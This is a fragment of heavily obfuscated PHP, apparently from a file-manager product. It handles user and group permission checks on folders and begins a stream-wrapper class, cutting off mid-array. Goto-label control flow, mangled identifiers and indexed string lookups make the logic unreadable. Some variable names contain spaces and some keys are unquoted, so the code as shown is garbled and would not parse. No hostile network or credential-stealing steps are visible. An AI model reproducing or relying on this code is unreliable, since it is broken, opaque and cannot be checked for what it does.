$c¼¡Ÿó½ƒ” = Model($eĞâˆ´Å‡«[484]); goto b›ÓÜì•¬¶; ešˆà˜ôÎ‚: $C÷Œ¶¡Ò¾ä = array_to_keyvalue_group($BÀ·ÜÀÅµÄ, $eĞâˆ´Å‡«[394]); foreach ($C÷Œ¶¡Ò¾ä as $cºÀù«š¶è => $f’¼’²«Í) { $dàĞïƒ‘Øé = $this->authArrayCheck($f’¼’²«Í, $d’ê‡¢ˆ¨œ); if ($dàĞïƒ‘Øé[$eĞâˆ´Å‡«[402]] > 0) { $CˆÜ‰ª¢ó†[] = $cºÀù«š¶è . $eĞâˆ´Å‡«[33]; } } $f®‹Ôùš¿¡ = array(); goto c³¹šùˆ„ö; eÊèÖÇ°¥×: $A³£½Éé‘º = array($eĞâˆ´Å‡«[1829] => $f®‹Ôùš¿¡, $eĞâˆ´Å‡«[1830] => $Eí£Ç™ÇÀŒ); $cá•¼ºÅëœ[$d’ê‡¢ˆ¨œ] = $A³£½Éé‘º; return $A³£½Éé‘º; goto e±Ğ¤§ÀÏÀ; e±Ğ¤§ÀÏÀ: } private function makeSourceAuth($d‘â©¹‘¥, $fÄ°æÈë…, $a¸‰Í’ãîÛ = false) { goto c£±•³Ã”¢; c•ˆÈ®Á·: $FßĞºİ™¦ƒ = $d‘â©¹‘¥[$CìÊ£Å¿…¶[396]] == SourceModel::TYPE_GROUP; $c›Ïòëó÷ = $FßĞºİ™¦ƒ ? $this->groupRootAuth($f‚İ£ˆÆ¶é, $a¸‰Í’ãîÛ) : !1; if ($c›Ïòëó÷ && Model($CìÊ£Å¿…¶[1817])->authCheckAction($c›Ïòëó÷[$CìÊ£Å¿…¶[401]], $CìÊ£Å¿…¶[1668])) { return $this->groupAuthInfo($c›Ïòëó÷, $f‚İ£ˆÆ¶é); } goto aç†ƒ¥ï¸Ş; c£±•³Ã”¢: $CìÊ£Å¿…¶ =& $_SERVER[¢Í]; $A’ÆÚÓİŞæ = $CìÊ£Å¿…¶[93]; $f‚İ£ˆÆ¶é = $d‘â©¹‘¥[$CìÊ£Å¿…¶[482]]; goto c•ˆÈ®Á·; aç†ƒ¥ï¸Ş: $D¥ğÔ‹¹Ñ÷ = Model($CìÊ£Å¿…¶[1169])->parentLevelArray($d‘â©¹‘¥[$CìÊ£Å¿…¶[485]]); $D¥ğÔ‹¹Ñ÷ = array_merge(array($d‘â©¹‘¥[$CìÊ£Å¿…¶[394]]), array_reverse($D¥ğÔ‹¹Ñ÷)); $c‘¾ó—Ú™® = !1; goto aØá¬æ¯Ôé; a’¸ÃîĞ„Ó: if (!$c‘¾ó—Ú™®) { $d´øˆëƒ‘£ = Model($CìÊ£Å¿…¶[484])->getInfo($f‚İ£ˆÆ¶é); $C“Ë£ëÜÆÊ = explode($CìÊ£Å¿…¶[47], trim($d´øˆëƒ‘£[$CìÊ£Å¿…¶[485]], $CìÊ£Å¿…¶[47])); foreach ($C“Ë£ëÜÆÊ as $A¯Ù”ìöÓ“) { if ($A¯Ù”ìöÓ“ == $CìÊ£Å¿…¶[494] || $A¯Ù”ìöÓ“ == $A’ÆÚÓİŞæ) { continue; } $eÖÙøäÊİÚ = $this->groupRootAuth($A¯Ù”ìöÓ“, $a¸‰Í’ãîÛ); if (!$eÖÙøäÊİÚ) { continue; } $c‘¾ó—Ú™® = $this->groupAuthInfo($eÖÙøäÊİÚ, $A¯Ù”ìöÓ“); break; } } if (!$c‘¾ó—Ú™® || $c‘¾ó—Ú™®[$CìÊ£Å¿…¶[402]] <= 0) { $d°ººÑ“²¡ = $this->authDeepCheck($d‘â©¹‘¥[$CìÊ£Å¿…¶[394]], $a¸‰Í’ãîÛ); if ($d°ººÑ“²¡) { $c‘¾ó—Ú™® = $d°ººÑ“²¡; } } return $c‘¾ó—Ú™®; goto a†ˆó²¤ˆŒ; aØá¬æ¯Ôé: foreach ($D¥ğÔ‹¹Ñ÷ as $F£ƒì®™ÒÂ) { if (!isset($fÄ°æÈë…[$F£ƒì®™ÒÂ])) { continue; } $c½é¨ßòÔ = $this->authMake($fÄ°æÈë…[$F£ƒì®™ÒÂ], $a¸‰Í’ãîÛ); if ($c½é¨ßòÔ[$CìÊ£Å¿…¶[443]]) { $c‘¾ó—Ú™® = $c½é¨ßòÔ; break; } } if (!$FßĞºİ™¦ƒ) { return $c‘¾ó—Ú™®; } if (!$c‘¾ó—Ú™® && $c›Ïòëó÷) { $c‘¾ó—Ú™® = $this->groupAuthInfo($c›Ïòëó÷, $f‚İ£ˆÆ¶é); } goto a’¸ÃîĞ„Ó; a†ˆó²¤ˆŒ: } private function userIsRoot($Aƒ± °Â = false) { $d‚…ºØÈĞ =& $_SERVER[¢Í]; if (!$Aƒ± °Â && _get($GLOBALS, $d‚…ºØÈĞ[483])) { return !0; } $bÅÇà»¼õÉ = Model($d‚…ºØÈĞ[503])->getInfo($Aƒ± °Â); $Eò‚ñµó„ = Model($d‚…ºØÈĞ[1838])->listData($bÅÇà»¼õÉ[$d‚…ºØÈĞ[1373]]); if ($Eò‚ñµó„ && $Eò‚ñµó„[$d‚…ºØÈĞ[1245]][$d‚…ºØÈĞ[1839]] == 1) { return !0; } return !1; } private function sourceAuthInfo($FôÌã×ÇâÚ) { goto B÷ÚÜ°¸ŒŸ; cĞ¾–›‡š¦: if (isset($BäÔ–†òİö[$aò¯³Ö“êÏ[490]])) { $e—‰“…œã = explode($aò¯³Ö“êÏ[8], trim($BäÔ–†òİö[$aò¯³Ö“êÏ[492]], $aò¯³Ö“êÏ[8])); array_shift($e—‰“…œã); $d’Ü¢ë‰È­ = $BäÔ–†òİö[$aò¯³Ö“êÏ[488]] . $aò¯³Ö“êÏ[1840] . implode($aò¯³Ö“êÏ[8], $e—‰“…œã); } return array($aò¯³Ö“êÏ[411] => $BäÔ–†òİö[$aò¯³Ö“êÏ[28]], $aò¯³Ö“êÏ[85] => KodIO::make($BäÔ–†òİö[$aò¯³Ö“êÏ[394]]), $aò¯³Ö“êÏ[1841] => $d’Ü¢ë‰È­); goto e Á’«†İ; B÷ÚÜ°¸ŒŸ: $aò¯³Ö“êÏ =& $_SERVER[¢Í]; $E§ËÁŞ¢ = Model($aò¯³Ö“êÏ[1169]); $BäÔ–†òİö = $E§ËÁŞ¢->sourceInfo($FôÌã×ÇâÚ); goto c«É§çİÀ; d§ƒŠèà•: $e†‰î‚ÏŞ = $E§ËÁŞ¢->_listAppendPath($e†‰î‚ÏŞ); $BäÔ–†òİö = $e†‰î‚ÏŞ[0]; $d’Ü¢ë‰È­ = $BäÔ–†òİö[$aò¯³Ö“êÏ[492]]; goto cĞ¾–›‡š¦; c«É§çİÀ: if (!$BäÔ–†òİö) { return !1; } $E§ËÁŞ¢->groupPathDisplay($BäÔ–†òİö); $e†‰î‚ÏŞ = array($BäÔ–†òİö); goto d§ƒŠèà•; e Á’«†İ: } private function groupAuthInfo($FºÏ¸Ò“ä, $AèÕ‹óĞŠ”) { $E¾¾›ôîÑ =& $_SERVER[¢Í]; $cÛ°Ÿä»µƒ = Model($E¾¾›ôîÑ[484])->getInfo($AèÕ‹óĞŠ”); return array($E¾¾›ôîÑ[1842] => intval($FºÏ¸Ò“ä[$E¾¾›ôîÑ[401]]), $E¾¾›ôîÑ[1826] => $FºÏ¸Ò“ä, $E¾¾›ôîÑ[1843] => LNG($E¾¾›ôîÑ[1844]), $E¾¾›ôîÑ[1835] => array($E¾¾›ôîÑ[411] => $cÛ°Ÿä»µƒ[$E¾¾›ôîÑ[28]], $E¾¾›ôîÑ[85] => KodIO::make($cÛ°Ÿä»µƒ[$E¾¾›ôîÑ[416]][$E¾¾›ôîÑ[394]]), $E¾¾›ôîÑ[1841] => $cÛ°Ÿä»µƒ[$E¾¾›ôîÑ[489]])); } protected function groupRootAuth($EË½äÛ²Ò­, $eˆ§“Ìë†Õ = false) { goto D¸Û‰ˆ»À; E´ëåÍ¢”Ì: $b×‡öõŸ“Û = $this->userGroupList($eˆ§“Ìë†Õ); $F—½˜µ–º = isset($b×‡öõŸ“Û[$EË½äÛ²Ò­]) ? $b×‡öõŸ“Û[$EË½äÛ²Ò­][$Dİİä…³œŠ[401]] : !1; if ($F—½˜µ–º && Model($Dİİä…³œŠ[1817])->authCheckAction($F—½˜µ–º[$Dİİä…³œŠ[401]], $Dİİä…³œŠ[1668])) { $Aàõçä²äˆ[$cé¦ê„¬£] = $F—½˜µ–º; return $F—½˜µ–º; } goto b‚Šèá­Ã–; D¸Û‰ˆ»À: $Dİİä…³œŠ =& $_SERVER[¢Í]; $eˆ§“Ìë†Õ = $eˆ§“Ìë†Õ ? $eˆ§“Ìë†Õ : USER_ID; $cé¦ê„¬£ = $eˆ§“Ìë†Õ . $Dİİä…³œŠ[1845] . $EË½äÛ²Ò­; goto E™§°øùÑ; b‚Šèá­Ã–: $c£… Üàùö = array($Dİİä…³œŠ[394] => $C»¥Õ‡Íª‚[$Dİİä…³œŠ[416]][$Dİİä…³œŠ[394]]); $f™‡¸†³ºê = $Dİİä…³œŠ[1825]; $BŞïŸƒ¡«Å = $this->field($f™‡¸†³ºê)->cacheMemory()->where($c£… Üàùö)->select(); goto E‰ñÛëø¥; E™§°øùÑ: static $Aàõçä²äˆ = array(); if (isset($Aàõçä²äˆ[$cé¦ê„¬£])) { return $Aàõçä²äˆ[$cé¦ê„¬£]; } $C»¥Õ‡Íª‚ = Model($Dİİä…³œŠ[484])->getInfo($EË½äÛ²Ò­); goto E´ëåÍ¢”Ì; b¶‚¯çóˆ: return $Aàõçä²äˆ[$cé¦ê„¬£]; goto A¡é¹ŸÖ³ù; E‰ñÛëø¥: $eíÊğ¿†Š = $BŞïŸƒ¡«Å ? $this->authMake($BŞïŸƒ¡«Å, $eˆ§“Ìë†Õ) : !1; $DÄ’îìòˆ× = $eíÊğ¿†Š ? $eíÊğ¿†Š[$Dİİä…³œŠ[443]] : !1; $Aàõçä²äˆ[$cé¦ê„¬£] = $DÄ’îìòˆ× ? $DÄ’îìòˆ× : $F—½˜µ–º; goto b¶‚¯çóˆ; A¡é¹ŸÖ³ù: } public function authOwnerApply($Dä¶†Ç‹õµ) { goto DÕ»Òã¢ó; DÕ»Òã¢ó: $d—‘ŸèŸóÇ =& $_SERVER[¢Í]; if (empty($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[401]]) || isset($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[1846]]) && $Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[1846]]) { return $Dä¶†Ç‹õµ; } if (AuthModel::authCheckRoot($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[401]][$d—‘ŸèŸóÇ[402]])) { return $Dä¶†Ç‹õµ; } goto b‰ù×ÓÍ®; C‰±·®ë¡: if (count($f’Ê³Û½ƒñ) == 0) { $f’Ê³Û½ƒñ = $this->authFolderOwnerGroup($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[482]]); } $f’Ê³Û½ƒñ = array_unique($f’Ê³Û½ƒñ); if (AuthModel::authCheckRoot($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[401]][$d—‘ŸèŸóÇ[402]])) { $f’Ê³Û½ƒñ[] = USER_ID; } goto b“³ñÊÊ¥Ô; b“³ñÊÊ¥Ô: $Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[401]][$d—‘ŸèŸóÇ[1848]] = Model($d—‘ŸèŸóÇ[500])->userListInfo($f’Ê³Û½ƒñ); return $Dä¶†Ç‹õµ; goto Dº²”×ÍÉ; e³ä¥ÔÑ»¢: $CæÜëÕĞÍç = array($d—‘ŸèŸóÇ[408] => array($d—‘ŸèŸóÇ[409], $a¬É»Çåßë)); $d«Èà¡ÊÒ± = $this->field($A×›£×¹•Ö)->where($CæÜëÕĞÍç)->select(); $d«Èà¡ÊÒ± = array_to_keyvalue_group($d«Èà¡ÊÒ±, $d—‘ŸèŸóÇ[394]); goto Aí„¶ë»Ìµ; Aí„¶ë»Ìµ: $Dà™Ñ®£‚ = array(); $f’Ê³Û½ƒñ = array(); foreach ($d«Èà¡ÊÒ± as $féå¥çÅ«Ñ => $BÂÕÎÂàÏ) { $CÇ¼¥Íñ¶£ = $this->authFolderOwnerUser($BÂÕÎÂàÏ); $Dà™Ñ®£‚[$féå¥çÅ«Ñ] = $CÇ¼¥Íñ¶£; $f’Ê³Û½ƒñ = array_merge($f’Ê³Û½ƒñ, $CÇ¼¥Íñ¶£[$d—‘ŸèŸóÇ[560]]); if ($CÇ¼¥Íñ¶£[$d—‘ŸèŸóÇ[1847]]) { break; } } goto C‰±·®ë¡; b‰ù×ÓÍ®: $a¬É»Çåßë = Model($d—‘ŸèŸóÇ[1169])->parentLevelArray($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[485]]); $a¬É»Çåßë = array_merge(array($Dä¶†Ç‹õµ[$d—‘ŸèŸóÇ[394]]), array_reverse($a¬É»Çåßë)); $A×›£×¹•Ö = $d—‘ŸèŸóÇ[1825]; goto e³ä¥ÔÑ»¢; Dº²”×ÍÉ: } private function authFolderOwnerGroup($BÎ¡ŒÃ…İ”) { $FµËíìÜÛ” =& $_SERVER[¢Í]; $e‰›ïÉ„Êİ = Model($FµËíìÜÛ”[1731])->where(array($FµËíìÜÛ”[1648] => $BÎ¡ŒÃ…İ”))->select(); $FÎ“ë­®Ë‰ = array(); if (!$e‰›ïÉ„Êİ) { return $FÎ“ë­®Ë‰; } foreach ($e‰›ïÉ„Êİ as $C™‰‹Èå¥) { $c¦¯Æè¢•é = $this->authInfo($C™‰‹Èå¥); if (AuthModel::authCheckRoot($c¦¯Æè¢•é[$FµËíìÜÛ”[401]])) { $FÎ“ë­®Ë‰[] = $C™‰‹Èå¥[$FµËíìÜÛ”[1489]]; } } return $FÎ“ë­®Ë‰; } private function authFolderOwnerUser($e¼ˆµ¨¢÷Ü) { $bçâÍğ©Ğô =& $_SERVER[¢Í]; $f£ƒ‰¦é™ƒ = array(); $c½¨¨Ùí©Û = !1; foreach ($e¼ˆµ¨¢÷Ü as $Bí½ùÔ…¼) { $E˜Å„ïœÙ = $this->authInfo($Bí½ùÔ…¼); if ($Bí½ùÔ…¼[$bçâÍğ©Ğô[482]] == $bçâÍğ©Ğô[494]) { $c½¨¨Ùí©Û = !0; } if ($Bí½ùÔ…¼[$bçâÍğ©Ğô[396]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($E˜Å„ïœÙ[$bçâÍğ©Ğô[401]])) { $f£ƒ‰¦é™ƒ[] = $Bí½ùÔ…¼[$bçâÍğ©Ğô[482]]; } } } return array($bçâÍğ©Ğô[560] => $f£ƒ‰¦é™ƒ, $bçâÍğ©Ğô[1847] => $c½¨¨Ùí©Û); } public function authMake($aâÍ£Ñ®ëí, $fè´çï¦ã¾ = false) { $fŸœÉŒ§ì” =& $_SERVER[¢Í]; $A˜§Â®ŸÉå = $this->authArrayCheck($aâÍ£Ñ®ëí, $fè´çï¦ã¾); if ($A˜§Â®ŸÉå[$fŸœÉŒ§ì”[1849]]) { $A˜§Â®ŸÉå[$fŸœÉŒ§ì”[1849]] = $this->sourceAuthInfo($A˜§Â®ŸÉå[$fŸœÉŒ§ì”[1849]]); } return $A˜§Â®ŸÉå; } public function authArrayCheck($Fí•‰‚‹ŸŞ, $dÙ¥Á¢šø¼ = false) { goto DŸÈÉÀ¤äã; dˆÉ‹òœšª: $f—™À‚Ùï“ = 1000; $aò¹‰‹½Ğ• = 0; $dÃ±ƒÅ»à¹ = 0; goto EŸÒŠƒ„Ğ; DÊ…ñ°˜‡: $FÓÉ®ĞÔ¸¨ = 0; $F©—á°É„ = 0; $aà˜˜ŒÇó¤ = 0; goto BÈØëá‚æ; EŸÒŠƒ„Ğ: $F·Î…Îêí = 0; $b¿—¤‰àÎ± = 0; $AšÂ“æÑ¯ó = array($cìÏ°òĞ‰ã[394] => 0); goto f­»„ààæî; DŸÈÉÀ¤äã: $cìÏ°òĞ‰ã =& $_SERVER[¢Í]; if (!$Fí•‰‚‹ŸŞ) { return array($cìÏ°òĞ‰ã[402] => 0, $cìÏ°òĞ‰ã[443] => !1); } $dÙ¥Á¢šø¼ = $dÙ¥Á¢šø¼ ? $dÙ¥Á¢šø¼ : USER_ID; goto DÊ…ñ°˜‡; eÉÆ¶øâÙÈ: return $e‘ÄÙ½”; goto EŸßâ™ªğÚ; BÈØëá‚æ: $AóèÑ…Ûâ‘ = 0; $cçìğ“¤Ñ = 0; $f¼‘ŒÕØñ = 0; goto dˆÉ‹òœšª; f­»„ààæî: foreach ($Fí•‰‚‹ŸŞ as $AšÂ“æÑ¯ó) { $a±ÙµªãÅ† = $this->authInfo($AšÂ“æÑ¯ó); if (!$a±ÙµªãÅ†) { continue; } $Eèï±–­Æõ = $AšÂ“æÑ¯ó[$cìÏ°òĞ‰ã[482]]; $A²–±‹……á = intval($a±ÙµªãÅ†[$cìÏ°òĞ‰ã[401]]); if ($AšÂ“æÑ¯ó[$cìÏ°òĞ‰ã[396]] == SourceModel::TYPE_USER && $Eèï±–­Æõ == $dÙ¥Á¢šø¼) { $FÓÉ®ĞÔ¸¨ = !0; $aà˜˜ŒÇó¤ = $a±ÙµªãÅ†; $F©—á°É„ = $A²–±‹……á; } else { if ($AšÂ“æÑ¯ó[$cìÏ°òĞ‰ã[396]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Eèï±–­Æõ, $dÙ¥Á¢šø¼)) { $AóèÑ…Ûâ‘ = !0; $F¢”êŸŒ™ì = $this->groupStepToUserGroup($Eèï±–­Æõ, $dÙ¥Á¢šø¼); if ($F¢”êŸŒ™ì < $f—™À‚Ùï“) { $f—™À‚Ùï“ = $F¢”êŸŒ™ì; $cçìğ“¤Ñ = $A²–±‹……á; $f¼‘ŒÕØñ = $a±ÙµªãÅ†; $aò¹‰‹½Ğ• = $Eèï±–­Æõ; } if ($F¢”êŸŒ™ì == $f—™À‚Ùï“ && $A²–±‹……á >= $cçìğ“¤Ñ) { $cçìğ“¤Ñ = $A²–±‹……á; $f¼‘ŒÕØñ = $a±ÙµªãÅ†; $aò¹‰‹½Ğ• = $Eèï±–­Æõ; } } else { if ($Eèï±–­Æõ == $cìÏ°òĞ‰ã[494]) { $dÃ±ƒÅ»à¹ = !0; $b¿—¤‰àÎ± = $a±ÙµªãÅ†; $F·Î…Îêí = $A²–±‹……á; } } } } if ($FÓÉ®ĞÔ¸¨) { $dàÂĞÎîêÉ = $F©—á°É„; $a±ÙµªãÅ† = $aà˜˜ŒÇó¤; $b¥¨àµĞ°È = LNG($cìÏ°òĞ‰ã[1850]); } else { if ($AóèÑ…Ûâ‘) { $dàÂĞÎîêÉ = $cçìğ“¤Ñ; $a±ÙµªãÅ† = $f¼‘ŒÕØñ; $dæ´Ì„‘ùö = Model($cìÏ°òĞ‰ã[484])->getInfo($aò¹‰‹½Ğ•); $b¥¨àµĞ°È = $cìÏ°òĞ‰ã[167] . $dæ´Ì„‘ùö[$cìÏ°òĞ‰ã[489]] . $cìÏ°òĞ‰ã[1851] . LNG($cìÏ°òĞ‰ã[1852]); } else { if ($dÃ±ƒÅ»à¹) { $dàÂĞÎîêÉ = $F·Î…Îêí; $a±ÙµªãÅ† = $b¿—¤‰àÎ±; $b¥¨àµĞ°È = LNG($cìÏ°òĞ‰ã[1822]); } else { $dàÂĞÎîêÉ = 0; $a±ÙµªãÅ† = !1; $b¥¨àµĞ°È = $cìÏ°òĞ‰ã[33]; } } } $e‘ÄÙ½” = array($cìÏ°òĞ‰ã[1842] => intval($dàÂĞÎîêÉ), $cìÏ°òĞ‰ã[1826] => $a±ÙµªãÅ†, $cìÏ°òĞ‰ã[1843] => $b¥¨àµĞ°È, $cìÏ°òĞ‰ã[1835] => $AšÂ“æÑ¯ó[$cìÏ°òĞ‰ã[394]]); goto eÉÆ¶øâÙÈ; EŸßâ™ªğÚ: } private function groupContainUser($DÖƒÍ††ÏÏ, $A…¾š‚¤İ = false) { return in_array($DÖƒÍ††ÏÏ, $this->userGroupParents($A…¾š‚¤İ)); } private function groupStepToUserGroup($añºàêîÏ·, $Aòùô‰¶› = false) { goto aé‰ÓÅöçŞ; Bçî·Ô÷Ê: return $Aì×±‹ê‡; goto E ¹ÙçƒÇÉ; aé‰ÓÅöçŞ: $F¬šÉ´İ =& $_SERVER[¢Í]; $Cá¸ÅæÔ¶ = $this->userGroupList($Aòùô‰¶›); $Aì×±‹ê‡ = 1000; goto eÁ½©çï×¥; eÁ½©çï×¥: $cƒ¦Úàéøë = $GLOBALS[$F¬šÉ´İ[6]][$F¬šÉ´İ[94]][$F¬šÉ´İ[1743]] == 1; $B¬ŠõºØÄÆ = $cƒ¦Úàéøë ? 3 : 2; foreach ($Cá¸ÅæÔ¶ as $F†¬‡É¾¡) { if ($F†¬‡É¾¡[$F¬šÉ´İ[1648]] == $añºàêîÏ·) { return 0; } $FÙÌÎ„î = explode($F¬šÉ´İ[47], trim($F†¬‡É¾¡[$F¬šÉ´İ[485]], $F¬šÉ´İ[47])); if ($FÙÌÎ„î[0] == $F¬šÉ´İ[494] && count($FÙÌÎ„î) > $B¬ŠõºØÄÆ) { $fˆƒÅ—¹Ò  = array_reverse(array_slice($FÙÌÎ„î, $B¬ŠõºØÄÆ)); $b÷†ğÂ—ƒÚ = array_search($añºàêîÏ·, $fˆƒÅ—¹Ò ); if ($b÷†ğÂ—ƒÚ !== !1 && $b÷†ğÂ—ƒÚ + 1 <= $Aì×±‹ê‡) { $Aì×±‹ê‡ = $b÷†ğÂ—ƒÚ + 1; } } } goto Bçî·Ô÷Ê; E ¹ÙçƒÇÉ: } private function userGroupList($E½’ìŒ‡ç× = false) { $d§•Š†ÛÌŒ =& $_SERVER[¢Í]; static $a•¾ãŒé§Ø = array(); if (isset($a•¾ãŒé§Ø[$E½’ìŒ‡ç×])) { return $a•¾ãŒé§Ø[$E½’ìŒ‡ç×]; } $AÂëé°©† = Model($d§•Š†ÛÌŒ[503])->getInfo($E½’ìŒ‡ç×); $a•¾ãŒé§Ø[$E½’ìŒ‡ç×] = array_to_keyvalue($AÂëé°©†[$d§•Š†ÛÌŒ[1823]], $d§•Š†ÛÌŒ[1648]); return $a•¾ãŒé§Ø[$E½’ìŒ‡ç×]; } public function userGroupParents($c ø™É˜³Ù) { goto Dª‡ò¡¾ä; fØ–¦˜×ï­: $D¡ŸƒáÇ‰­ = $GLOBALS[$c×ß™ÜÔ®Ò[6]][$c×ß™ÜÔ®Ò[94]][$c×ß™ÜÔ®Ò[1743]] == 1; $bØ÷„†¯ºî = $D¡ŸƒáÇ‰­ ? 3 : 2; foreach ($Eˆô‘¸Ò‰ as $Fö›¬Â÷³Å) { $AòŞ÷¡…º = array($Fö›¬Â÷³Å[$c×ß™ÜÔ®Ò[1648]]); $dÖâóçñÑ· = explode($c×ß™ÜÔ®Ò[47], trim($Fö›¬Â÷³Å[$c×ß™ÜÔ®Ò[485]], $c×ß™ÜÔ®Ò[47])); if ($dÖâóçñÑ·[0] == $c×ß™ÜÔ®Ò[494] && count($dÖâóçñÑ·) > $bØ÷„†¯ºî) { $eä¥‚÷¥È = array_slice($dÖâóçñÑ·, $bØ÷„†¯ºî); $AòŞ÷¡…º = array_merge($AòŞ÷¡…º, array_reverse($eä¥‚÷¥È)); } $f×ñŒ¹£º = array_merge($f×ñŒ¹£º, $AòŞ÷¡…º); } goto C­Ïˆ™’ÎÕ; Dª‡ò¡¾ä: $c×ß™ÜÔ®Ò =& $_SERVER[¢Í]; static $A™”—ËÃ‰ = array(); $c ø™É˜³Ù = $c ø™É˜³Ù ? $c ø™É˜³Ù : USER_ID; goto F±‘åÜ‡£; C­Ïˆ™’ÎÕ: $A™”—ËÃ‰[$c ø™É˜³Ù] = array_unique($f×ñŒ¹£º); return $A™”—ËÃ‰[$c ø™É˜³Ù]; goto DºÏÜªª¬º; F±‘åÜ‡£: if (isset($A™”—ËÃ‰[$c ø™É˜³Ù])) { return $A™”—ËÃ‰[$c ø™É˜³Ù]; } $Eˆô‘¸Ò‰ = $this->userGroupList($c ø™É˜³Ù); $f×ñŒ¹£º = array(); goto fØ–¦˜×ï­; DºÏÜªª¬º: } public function authTargetInfoMake($e‚×İÆ–Ê„) { goto cÊÒÎ­éĞ‚; cÊÒÎ­éĞ‚: $F»ÖÄø´ =& $_SERVER[¢Í]; $fÍ¸“Ô†˜½ = array(); $D°äÃäè„Ì = array(); goto D’“ÄÓÉ¤š; fø‡î‚«…ç: return array($F»ÖÄø´[1853] => $fÍ¸“Ô†˜½, $F»ÖÄø´[1854] => $D°äÃäè„Ì); goto Bµ·ãç†; D’“ÄÓÉ¤š: foreach ($e‚×İÆ–Ê„ as $AŒÃ ò†×í) { if ($AŒÃ ò†×í[$F»ÖÄø´[396]] == SourceModel::TYPE_USER) { $fÍ¸“Ô†˜½[] = intval($AŒÃ ò†×í[$F»ÖÄø´[482]]); } else { if ($AŒÃ ò†×í[$F»ÖÄø´[396]] == SourceModel::TYPE_GROUP) { $D°äÃäè„Ì[] = intval($AŒÃ ò†×í[$F»ÖÄø´[482]]); } } } if ($fÍ¸“Ô†˜½) { $fÍ¸“Ô†˜½ = Model($F»ÖÄø´[500])->userListInfo($fÍ¸“Ô†˜½); } if ($D°äÃäè„Ì) { $FÇé°ğËÍĞ = array($F»ÖÄø´[1729] => array($F»ÖÄø´[409], $D°äÃäè„Ì)); $D°äÃäè„Ì = Model($F»ÖÄø´[484])->field($F»ÖÄø´[1742])->where($FÇé°ğËÍĞ)->select(); $D°äÃäè„Ì = array_to_keyvalue($D°äÃäè„Ì, $F»ÖÄø´[1648]); } goto fø‡î‚«…ç; Bµ·ãç†: } public function authInfo($eÒİ™ÎÇ´) { $eÈÏ‰¢¤¶± =& $_SERVER[¢Í]; if ($eÒİ™ÎÇ´[$eÈÏ‰¢¤¶±[1797]]) { $BØÆµÁ÷Ùİ = Model($eÈÏ‰¢¤¶±[1817])->listData($eÒİ™ÎÇ´[$eÈÏ‰¢¤¶±[1797]]); if (!$BØÆµÁ÷Ùİ) { return !1; $bªÚ§Ï­° = Model($eÈÏ‰¢¤¶±[1817])->listData(); $f¨çã°Èµ£ = array_filter_by_field($bªÚ§Ï­°, $eÈÏ‰¢¤¶±[401], $eÈÏ‰¢¤¶±[494]); return $f¨çã°Èµ£; } $c¨†÷«ôÑ = array_field_key($BØÆµÁ÷Ùİ, array($eÈÏ‰¢¤¶±[392], $eÈÏ‰¢¤¶±[28], $eÈÏ‰¢¤¶±[401], $eÈÏ‰¢¤¶±[1669], $eÈÏ‰¢¤¶±[1671])); $c¨†÷«ôÑ[$eÈÏ‰¢¤¶±[1855]] = $eÒİ™ÎÇ´; return $c¨†÷«ôÑ; } else { return array($eÈÏ‰¢¤¶±[410] => 0, $eÈÏ‰¢¤¶±[1654] => $eÒİ™ÎÇ´[$eÈÏ‰¢¤¶±[1798]], $eÈÏ‰¢¤¶±[411] => $eÈÏ‰¢¤¶±[33], $eÈÏ‰¢¤¶±[1669] => $eÈÏ‰¢¤¶±[1856]); } } } goto D£¥œ–¦ÛÕ; a›ÎÔ÷¿Ô: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($b‰õÓÇÕ, $b¥ñ¥¶óñÉ = '') { goto C–ªí‚Ÿ‚; B¯Ò¥ˆÜ£: return $this->info ? !0 : !1; goto FÆ¯È´“¼Ğ; C–ªí‚Ÿ‚: $this->info = $this->info($b‰õÓÇÕ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¢Í][85]]; goto eÓÄ¬¬Ïºâ; eÓÄ¬¬Ïºâ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$b‰õÓÇÕ])) { self::$_chunkBuffer[$b‰õÓÇÕ] = array(); } goto B¯Ò¥ˆÜ£; FÆ¯È´“¼Ğ: } function stream_read($cŠ¿ˆ¾©Îô) { $a«Ëİç×˜¨ = $this->fileSubstr($this->pose, $cŠ¿ˆ¾©Îô); $this->pose += strlen($a«Ëİç×˜¨); return $a«Ëİç×˜¨; } public function stream_tell() { return $this->pose; } public function stream_seek($fÙ‹ôå•Ò, $C©Æõï²çª) { $c¿Œ­‚–¿æ =& $_SERVER[¢Í]; if ($C©Æõï²çª == SEEK_SET) { $this->pose = $fÙ‹ôå•Ò; } else { if ($C©Æõï²çª == SEEK_CUR) { $this->pose += $fÙ‹ôå•Ò; } else { if ($C©Æõï²çª == SEEK_END) { $this->pose = $this->info[$c¿Œ­‚–¿æ[87]] + intval($fÙ‹ôå•Ò); } } } if ($fÙ‹ôå•Ò < 0) { $this->pose = $this->info[$c¿Œ­‚–¿æ[87]] + $fÙ‹ôå•Ò; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¢Í][87]]; } public function stream_close() { return !0; } public function url_stat($c»ÜÕêêæ, $EÊá¯ÜÂ) { $CˆÒÅé‡µ· =& $_SERVER[¢Í]; $CÊ…Ä¬Õ»¨ = $this->info($c»ÜÕêêæ); return array($CˆÒÅé‡µ·[1342] => 0, $CˆÒÅé‡µ·[1343] => 0, $CˆÒÅé‡µ·[12] => 32768 + 511, $CˆÒÅé‡µ·[1344] => 0, $CˆÒÅé‡µ·[1345] => 0, $CˆÒÅé‡µ·[1346] => 0, $CˆÒÅé‡µ·[1347] => 0, $CˆÒÅé‡µ·[87] => $CÊ…Ä¬Õ»¨[$CˆÒÅé‡µ·[87]], $CˆÒÅé‡µ·[1348] => $CÊ…Ä¬Õ»¨[$CˆÒÅé‡µ·[1217]], $CˆÒÅé‡µ·[1304] => $CÊ…Ä¬Õ»¨[$CˆÒÅé‡µ·[117]], 